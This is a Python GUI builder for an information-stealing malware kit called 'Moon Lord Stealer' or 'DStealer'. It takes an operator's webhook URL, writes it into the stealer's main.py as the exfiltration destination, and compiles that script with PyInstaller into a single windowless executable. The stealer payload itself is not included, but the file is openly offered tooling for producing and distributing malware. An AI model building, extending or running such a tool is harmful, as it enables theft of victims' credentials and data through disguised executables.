import os
import customtkinter as ctk
from tkinter import messagebox
import subprocess

ctk.set_appearance_mode("dark")
app = ctk.CTk()
app.title("Moon Lord Stealer | Builder")
app.geometry("400x240")
app.resizable(False, False)

app.update_idletasks()
screen_width = app.winfo_screenwidth()
screen_height = app.winfo_screenheight()
x = (screen_width - app.winfo_reqwidth()) // 2
y = (screen_height - app.winfo_reqheight()) // 2
app.geometry(f"+{x}+{y}")


def validate_webhook(webhook):
    return "api/webhooks" in webhook


def replace_webhook(webhook):
    file_path = "main.py"

    with open(file_path, "r", encoding="utf-8") as f:
        lines = f.readlines()

    for i, line in enumerate(lines):
        if line.strip().startswith("h00k ="):
            lines[i] = f'h00k = "{webhook}"\n'
            break

    with open(file_path, "w", encoding="utf-8") as f:
        f.writelines(lines)


def default_webhook():
    file_path = "main.py"

    with open(file_path, "r", encoding="utf-8") as f:
        lines = f.readlines()

    for i, line in enumerate(lines):
        if line.strip().startswith("h00k ="):
            lines[i] = f'h00k = "WEBHOOK HERE"\n'
            break

    with open(file_path, "w", encoding="utf-8") as f:
        f.writelines(lines)


def build_exe():
    webhook = entry.get()

    if validate_webhook(webhook):
        replace_webhook(webhook)

        message = "Build process started. This may take a while...\n"
        messagebox.showinfo("Information", message)

        # Customizing PyInstaller build command
        build_dir = os.path.join(os.getcwd(), "build")
        dist_dir = os.path.join(os.getcwd(), "dist")
        
        subprocess.run([
            "python",
            "-m",
            "PyInstaller",
            "--onefile",
            "--noconsole",
            "--clean",
            "--distpath", f"{dist_dir}",
            "--workpath", f"{build_dir}/work",
            "--specpath", f"{build_dir}/spec",
            "--debug=imports",
            "main.py"
        ], shell=True, check=True)

        messagebox.showinfo("Build Success", "Build process completed successfully. Check your dist folder.")
    else:
        messagebox.showerror("Error", "Invalid webhook URL!")

    default_webhook()

label = ctk.CTkLabel(master=app, text="DStealer", text_color=("white"), font=("Helvetica", 26))
label.place(relx=0.5, rely=0.2, anchor=ctk.CENTER)

entry = ctk.CTkEntry(master=app, width=230, height=30, placeholder_text="Enter your webhook")
entry.place(relx=0.5, rely=0.4, anchor=ctk.CENTER)

button = ctk.CTkButton(master=app, text="Build", text_color="white", hover_color="#363636", fg_color="black", command=build_exe)
button.place(relx=0.5, rely=0.6, anchor=ctk.CENTER)

app.mainloop()